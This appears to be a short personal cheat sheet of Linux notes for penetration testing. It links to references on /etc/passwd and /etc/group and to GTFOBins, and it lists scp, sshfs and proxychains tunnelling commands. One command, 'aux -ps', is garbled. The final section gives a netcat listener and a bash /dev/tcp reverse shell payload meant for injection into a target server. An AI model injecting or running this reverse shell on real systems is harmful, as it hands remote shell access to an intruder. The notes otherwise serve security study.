+++
title = "Something Interesting About Linux"
date = "2019-03-05"
weight = 100
+++

### Linux Introduction ###
[Understand the `/etc/passwd` file](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/)    
[Understand `/etc/group` file](https://www.cyberciti.biz/faq/understanding-etcgroup-file/)     
[Very useful link: https://gtfobins.github.io](https://gtfobins.github.io/)
### Useful Commands ###
```html
crontab -l
aux -ps
```
#### SSH ####
```html
scp [source_file] [user]@$IP:[destination_path]
```
#### Mount ####
```html 
sshfs [user]@$IP:[destination_path] [source_file]
```

#### SSH Tunnel Dynamic Port Forwarding ####
```html
vim /etc/proxychains.conf (edit conf to set listening port)   
ssh -D <listening port> -l <username>        
proxychains <command> (nmap/firefox etc)
```           
#### Reverse Shell ####
#### Listen Side: ####
```html
nc -nlvp 12345
```
#### Server Side Injection Code: ####
Bash   
```html
/bin/bash -i >& /dev/tcp/&#60ip&#62/12345 0>&1
```      
